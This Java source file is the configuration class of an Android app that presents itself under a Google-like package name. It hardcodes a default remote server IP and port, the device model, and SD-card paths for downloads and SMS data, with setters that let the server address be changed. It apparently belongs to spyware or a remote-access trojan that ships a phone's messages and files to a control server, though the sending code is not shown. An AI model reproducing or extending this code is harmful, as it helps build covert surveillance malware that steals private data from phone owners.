package com.google.android.android;

import android.content.SharedPreferences;
import android.os.Build;

/**
 * Created by user-pc on 01.06.2017.
 */

public class Config {
    private static SharedPreferences _preferences;

    public static String IP_ADDRESS;
    public static int SERVER_PORT;

    public static String PHONE_NAME;
    public static String DOWNLOAD_PATH;
    public static String SMS_PATH;

    public static void load(SharedPreferences preferences) {
        _preferences = preferences;
        IP_ADDRESS = preferences.getString("IP_ADDRESS", "89.223.26.160");
        SERVER_PORT = preferences.getInt("SERVER_PORT", 1121);
        PHONE_NAME = preferences.getString("PHONE_NAME", Build.MODEL);
        DOWNLOAD_PATH = preferences.getString("DOWNLOAD_PATH", "sdcard/Android/");
        SMS_PATH = preferences.getString("SMS_PATH", "sdcard/Android/");
    }

    public static boolean setName(String name) {
        SharedPreferences.Editor editor = _preferences.edit();
        editor.putString("PHONE_NAME", name);
        if (editor.commit()) {
            PHONE_NAME = name;
            return true;
        }
        return false;
    }

    public static boolean setIpAddress(String ipAddress) {
        SharedPreferences.Editor editor = _preferences.edit();
        editor.putString("IP_ADDRESS", ipAddress);
        if (editor.commit()) {
            IP_ADDRESS = ipAddress;
            return true;
        }
        return false;
    }

    public static boolean setServerPort(int serverPort) {
        SharedPreferences.Editor editor = _preferences.edit();
        editor.putInt("SERVER_PORT", serverPort);
        if (editor.commit()) {
            SERVER_PORT = serverPort;
            return true;
        }
        return false;
    }
}